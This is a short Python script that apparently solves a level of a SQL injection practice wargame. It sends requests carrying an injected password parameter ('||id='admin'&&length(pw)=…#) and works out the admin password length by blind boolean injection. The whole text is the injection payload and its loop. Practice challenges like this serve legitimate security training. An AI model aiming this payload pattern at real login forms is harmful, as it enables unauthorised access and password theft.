import requests
url = 'https://los.rubiya.kr/chall/orge_bad2f25db233a7542be75844e314e9f3.php'
cookie = {'PHPSESSID' : 개인쿠키값}

for i in range(1, 30):
    req_url = url + f"?pw= '||id='admin'%26%26length(pw)={i}%23"
    res = requests.get(req_url, cookies=cookie)
    if "<h2>Hello admin</h2>" in res.text:
        print(f"{i} -> O")
        break
    else:
        print(f"{i} ---> X")